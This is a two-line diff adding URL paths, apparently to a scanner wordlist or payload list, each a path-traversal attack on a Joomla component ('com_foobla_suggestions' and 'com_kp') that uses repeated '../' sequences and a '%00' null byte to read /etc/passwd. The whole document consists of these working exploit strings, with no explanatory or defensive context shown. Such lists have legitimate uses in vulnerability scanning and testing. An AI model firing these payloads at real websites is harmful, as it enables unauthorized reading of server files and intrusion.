@@ -1,0 +1,2 @@
+/index.php?option=com_foobla_suggestions&controller=../../../../../../../../../../../../etc/passwd%00
+/index.php?option=com_kp&controller=../../../../../../../../../../../../etc/passwd%00
